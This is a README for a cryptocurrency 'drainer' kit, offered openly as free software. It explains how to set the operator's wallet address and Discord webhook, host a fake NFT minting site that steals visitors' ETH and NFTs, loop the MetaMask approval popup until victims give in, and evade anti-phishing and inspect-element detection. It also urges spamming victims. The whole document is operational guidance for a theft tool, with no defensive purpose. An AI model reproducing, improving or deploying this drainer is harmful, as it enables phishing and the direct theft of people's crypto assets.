### If you have questions or need any help, contact me on discord: skyedrains or [Telegram]https://t.me/skylinedraner dm me for more index

# This is a free software **YOU DONT NEED TO PAY NOTHING**

## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer

## `💡 Features`

- [x] simple design 
- [x] Immediate transactions
- [x] Contract not required
- [x] Metamask Anti Phishing Detections
- [x] Anti F12 Inspect
- [x] Inspect Element Detection
- [x] Custom-made working Site (index.html)
- [x] Build-in API

## `✏️ Guidelines on Setting Up the Drainer:` 
you need to edit the **configs.js**.
- line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your wallet address (metamask is the best one).**
- line 2: const Webhook = `"Webhook";` replace this by **your discord webhook**

  - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
  - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.
  
  To get instant support, contact me on discord: skyedrains or [Telegram]https://t.me/LLLLcrptyo

## `🚀 Deploy`

**1- Navigate to the directory where you downloaded the script.**<br>
**2- Host the website by placing all the files in a web server of your choice.**<br>
**3- Launch the hosted website in a web browser.**<br>

## `👻 Important : `

- Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
- Line **"minValue: 0.2,"** is the minimum value of a NFT before it gets stolen. 
Exemple : If you change this value to **1**, the script will only steal NFTs that have a value higher to **1**.
### **the more you spam, the more you earn**
### ➢ To see the metamask popup, you must host the website

Host the website to see the styles and the drainer popup

note:You can use LiveServer on VScode


made with ❤️ by skye

